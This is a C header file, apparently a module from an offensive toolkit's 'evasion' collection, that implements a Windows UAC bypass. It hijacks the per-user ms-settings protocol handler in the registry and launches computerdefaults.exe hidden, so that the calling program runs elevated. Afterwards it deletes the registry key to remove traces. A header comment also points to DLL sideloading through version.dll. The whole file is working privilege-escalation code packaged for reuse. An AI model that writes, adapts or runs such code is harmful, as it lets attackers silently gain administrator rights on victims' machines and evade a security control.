// chunk: evasion/uac_computerdefaults
// depends: (none)
// provides: uac_elevate_computerdefaults
// headers: windows.h
// risk: medium
// note: UAC bypass via computerdefaults.exe — hijacks ms-settings protocol handler.
//       Same technique as fodhelper but uses a different auto-elevate binary.
//       Also works as a DLL sideload target (loads version.dll from its directory).

#ifndef CHUNK_UAC_COMPUTERDEFAULTS
#define CHUNK_UAC_COMPUTERDEFAULTS

#include <windows.h>

static int uac_elevate_computerdefaults(void) {
    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);

    HKEY hk;
    LONG r = RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\Shell\\Open\\command",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
    if (r != ERROR_SUCCESS) return 0;

    RegSetValueExA(hk, NULL, 0, REG_SZ, (BYTE *)self_path, (DWORD)strlen(self_path) + 1);
    RegSetValueExA(hk, "DelegateExecute", 0, REG_SZ, (BYTE *)"", 1);
    RegCloseKey(hk);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpFile = "C:\\Windows\\System32\\computerdefaults.exe";
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShellExecuteExA(&sei);

    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }

    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
    return 1;
}

#endif
